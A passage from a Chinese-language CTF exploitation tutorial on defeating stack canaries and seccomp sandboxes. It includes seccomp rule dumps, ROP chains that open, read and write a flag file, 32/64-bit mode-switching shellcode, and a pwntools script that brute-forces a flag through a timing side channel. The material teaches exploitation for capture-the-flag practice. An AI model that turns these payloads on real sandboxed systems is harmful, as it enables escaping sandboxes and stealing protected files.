__stack_chk_failed 函数，可以通过比如格式化字符串漏洞修改 got 表中对应
__stack_chk_failed 的位置为后门函数的地址来实施攻击。 ## 利用
__stack_chk_failed 函数报错信息泄露数据 __stack_chk_failed
函数输出错误信息时会把 __libc_argv[0] 作为信息输出，也就是 main
函数参数的
argv[0]，这个参数保存在栈中，如果可以覆盖该参数，也就可以打印出需要泄露的信息。</p>
<h2 id="覆盖-canary-初始值">覆盖 canary 初始值</h2>
<p>linux 下 fs 寄存器指向当前栈的 TLS 结构，fs:0x28 指向的是 TLS
结构中的 stack_guard 值，如果可以覆盖位于 TLS 中的 canary
初始值就可以绕过 canary 保护。 - 栈和 mmap 出的内存一般离 TLS
很近，可以通过溢出覆盖。 - gdb下利用
<code>search -canary字节数 canary</code> 命令可以快速定位出 canary
的位置。</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_cc2c970b6ae5033b88ec97722344e326" >例题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>另外如果题目中申请的 chunk 大小限制不能很大，无法触发 mmap 且只能申请
1 次，那么就无法通过堆溢出修改 canary 。</p>
<p>但是像<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/21st_century" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以通过栈溢出伪造环境变量添加
<code>MALLOC_MMAP_THRESHOLD_=1</code> ，这样即使 malloc 很小的 chunk
也会触发 mmap 分配内存，因此同样可以覆盖 canary 。 # 沙箱绕过</p>
<p>这里的沙箱通常指的是 seccomp 。</p>
<h2 id="基本概念">基本概念</h2>
<p><code>PR_SET_SECCOMP</code> 是 Linux
内核提供的一种机制，用于限制进程可以执行的系统调用，从而增强系统的安全性。<code>PR_SET_SECCOMP</code>
机制可以通过使用 <code>prctl()</code> 系统调用来设置，具体来说，可以通过
<code>PR_SET_SECCOMP</code> 命令设置进程的 seccomp 过滤器，或通过
<code>PR_SET_NO_NEW_PRIVS</code> 命令设置进程的
<code>no_new_privs</code> 标志。</p>
<p>seccomp 过滤器可以通过编写 BPF（Berkeley Packet
Filter）程序来实现，BPF
程序可以过滤进程所发起的系统调用，只允许特定的系统调用通过，从而限制进程的行为。seccomp
过滤器只能在进程启动时设置，并且一旦设置，就不能修改，这样可以防止攻击者通过注入代码来修改过滤器。</p>
<p><code>PR_SET_NO_NEW_PRIVS</code>
标志可以用于禁止进程获取更高的权限，即使进程拥有特权级别的用户或进程权限。这可以防止进程通过提升权限来攻击系统，从而增强系统的安全性。</p>
<p><strong>一般使用 seccomp 有两种方法，一种是用 <code>prctl</code>
，另一种是用 <code>seccomp</code> 。</strong> ### 使用 prctl 创建
seccomp</p>
<p>我们可以借助工具 seccomp-tools 来编写沙箱规则。</p>
<p>首先编写沙箱规则，这里我们保存在文件 <code>rule</code> 中。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : kill</span><br><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? kill : next</span><br><span class="line">A == execve ? kill : allow</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br><span class="line">kill:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure></div> 运行命令将沙箱规则转换为可被 <code>PR_SET_SECCOMP</code>
识别的规则。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm - </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div> 将生成的规则应用到 c 程序中，这里使用
<code>prctl</code> 系统调用来设置沙箱规则。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义过滤器规则</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000004</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0xc000003e</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0000003b</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">            .len = (<span class="type">unsigned</span> <span class="type">short</span>) (<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">            .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置seccomp过滤器</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] prctl error.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 编译后通过
<code>seccomp-tools dump</code> 命令可以看到程序中有了 seccomp
规则（<code>ptctl</code> 系统调用需要 root 权限因此需要加 sudo）。
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ sudo seccomp-tools dump ./test</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div> 运行程序发现 <code>execve</code> 系统调用无法正常执行。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ sudo ./test    </span><br><span class="line">[1]    40123 invalid system call  sudo ./test</span><br></pre></td></tr></table></figure></div> ### 使用 seccomp 创建 seccomp 如果是使用
<code>seccomp</code> 系统调用添加规则，那么首先需要安装
<code>seccomp</code> 库的开发包： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libseccomp-dev</span><br></pre></td></tr></table></figure></div>
前面的代码可以写作如下形式： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个过滤器上下文</span></span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加过滤规则</span></span><br><span class="line">    seccomp_arch_add(ctx, SCMP_ARCH_X86_64);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 其中添加规则的函数
<code>seccomp_arch_add</code> 定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seccomp_rule_add</span><span class="params">(scmp_filter_ctx ctx, <span class="type">uint32_t</span> action, <span class="type">int</span> syscall, <span class="type">unsigned</span> <span class="type">int</span> arg_cnt, ...)</span>;</span><br></pre></td></tr></table></figure></div>
其中参数解释如下： - <code>ctx</code>：过滤器上下文，用于存储过滤规则。
- <code>action</code>：当规则匹配时的操作，可以是以下值之一。 -
<code>SCMP_ACT_ALLOW</code>：允许系统调用。 -
<code>SCMP_ACT_KILL</code>：杀死进程。 -
<code>SCMP_ACT_ERRNO</code>：返回错误码并允许系统调用，用法为
<code>SCMP_ACT_ERRNO(返回值)</code>
，这样该系统调用如果满足条件则直接返回定义的返回值而不进行系统调用。在某些题目中通常用来劫持特定系统调用返回特殊值，比如劫持
<code>open</code> 系统调用返回 0 即标准输入。 -
<code>syscall</code>：要限制的系统调用号。 -
<code>arg_cnt</code>：要匹配的参数数量，如果没有参数需要匹配，则
<code>arg_cnt</code> 应该为 0 。 -
<code>...</code>：可变参数列表，用于指定要匹配的参数值。对于每个参数，需要指定一个
<code>scmp_arg_cmp</code>
结构体，这个结构体包含了参数的比较方式和比较值。<code>scmp_arg_cmp</code>
结构体定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scmp_arg_cmp</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> arg;	<span class="comment">/**&lt; argument number, starting at 0 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">scmp_compare</span> <span class="title">op</span>;</span>	<span class="comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span></span><br><span class="line">	<span class="type">scmp_datum_t</span> datum_a;</span><br><span class="line">	<span class="type">scmp_datum_t</span> datum_b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> -
<code>arg</code>：要比较的参数序号，从0开始。 -
<code>op</code>：比较方式，可以是以下值之一： -
<code>SCMP_CMP_NE</code>：不等于 - <code>SCMP_CMP_EQ</code>：等于 -
<code>SCMP_CMP_LT</code>：小于 - <code>SCMP_CMP_LE</code>：小于等于 -
<code>SCMP_CMP_GT</code>：大于 - <code>SCMP_CMP_GE</code>：大于等于 -
<code>SCMP_CMP_MASKED_EQ</code>：按位与运算后等于（比较值为掩码）。 -
<code>datum_a</code>：用来与参数进行比较的值。</p>
<p>例如下面的代码添加的规则是规定 <code>read</code>
必须从标准输入读取不超过 <code>BUF_SIZE</code> 的内容到 <code>buf</code>
中。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 0x100</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE];</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                     SCMP_A0(SCMP_CMP_EQ, fileno(<span class="built_in">stdin</span>)),</span><br><span class="line">                     SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>) buf),</span><br><span class="line">                     SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br></pre></td></tr></table></figure></div> ## 绕过方法 ### orw 一直常见的沙箱类型是禁用
<code>execve</code>
系统调用。这种类型的沙箱通常的绕过方法是劫持控制流通过 rop 或 shellcode
依次调用 <code>open</code> ，<code>read</code> ，<code>write</code>
来完成对 <code>flag</code> 文件的读取和输出。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(file_name_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
<p>32 位下由于 linux
调用约定是外平栈，因此连续函数调用需要在函数返回地址写平栈 gadget 。
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p32(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p32(file_name_addr)</span><br><span class="line">rop += p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p32(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; pop edi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p32(<span class="number">3</span>)</span><br><span class="line">rop += p32(buf_addr)</span><br><span class="line">rop += p32(<span class="number">0x100</span>)</span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p32(buf_addr)</span><br></pre></td></tr></table></figure></div> ### 使用功能相似的系统调用替代 有的题目除了禁用
<code>execve</code> 系统调用外，还可能会禁用 <code>open</code>
，<code>read</code> ，<code>write</code> 这些系统调用。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line">0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011</span><br><span class="line">0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011</span><br><span class="line">0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011</span><br><span class="line">0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011</span><br><span class="line">0009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line">0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
对于这种情况我们可以使用可以代替被禁用的系统调用的其他系统调用。</p>
<p>例如 <code>open</code> 的替代系统调用 <code>openat</code>
使用方法如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #define __NR_openat 257</span></span><br><span class="line"><span class="comment"> * # define AT_FDCWD        -100</span></span><br><span class="line"><span class="comment"> * #define O_RDONLY         00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd = syscall(__NR_openat, AT_FDCWD, <span class="string">&quot;main.cpp&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure></div></p>
<p><strong>需要注意 <code>open</code> 函数实际上是调用了
<code>openat</code> 系统调用。</strong> ### 使用 4 字节系统调用号绕过
例如下面这种情况，虽然所有可例用的系统调用号都被禁了，但是由于没有判断
<code>sys_number &gt;= 0x40000000</code> 的情况，因此可以使用
<code>0x40000000|sys_number</code> 来绕过。这里 <code>sys_number</code>
是 64 位的系统调用号。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line">0004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0009</span><br><span class="line">0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009</span><br><span class="line">0006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0009</span><br><span class="line">0007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 0009</span><br><span class="line">0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-32-位-shellcode-绕过">使用 32 位 shellcode 绕过</h3>
<p>例如这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/27" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，该题目的沙箱规则如下：
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0006</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div> 可以看到这个沙箱规则没有判断
<code>A != ARCH_X86_64</code> 的情况，因此可以使用如下 shellcode 切换到
32 位完成 orw 。位数切换是通过 retf 指令跨段跳转完成。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r8, 0x23</span></span><br><span class="line"><span class="string">shl r8, 0x20</span></span><br><span class="line"><span class="string">mov rax, rdi</span></span><br><span class="line"><span class="string">add rax, 0x17</span></span><br><span class="line"><span class="string">or rax, r8</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">push 0x1010101</span></span><br><span class="line"><span class="string">xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">add edx, 0x22</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br></pre></td></tr></table></figure></div>
这里需要注意的是： - rdi 寄存器需要指向 shellcode 的地址。 - shellcode
的地址需要小于 0x100000000 。 ### 使用 shellcode 侧信道爆破 flag
如果沙箱完全禁用了所有 <code>write</code>
相关的系统调用（有的题目是关闭了输出流）则需要采用 shellcode 侧信道爆破
flag 。</p>
<p>例如这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/30" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里有一个判断进程是否退出的技巧：<code>p.recv(timeout=1)</code>
。如果进程已经结束会触发异常，而进程未结束但没有输出导致超时则接收数据长度为
0 ，并不会触发异常。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    p = process([elf.path])</span><br><span class="line">    shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            push 0x67616c66</span></span><br><span class="line"><span class="string">            mov rdi, rsp</span></span><br><span class="line"><span class="string">            xor esi, esi</span></span><br><span class="line"><span class="string">            push 2</span></span><br><span class="line"><span class="string">            pop rax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi, rax</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov edx, 0x100</span></span><br><span class="line"><span class="string">            xor eax, eax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov dl, [rsp + &#123;&#125;]</span></span><br><span class="line"><span class="string">            cmp dl, &#123;&#125;</span></span><br><span class="line"><span class="string">            jbe $</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        p.kill()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0x20</span></span><br><span class="line">    r = <span class="number">0x7f</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(m):</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(l)</span><br><span class="line">    log.info(flag)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></div> ### 使用 close 绕过 fd 参数检查
例如这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的沙箱规定
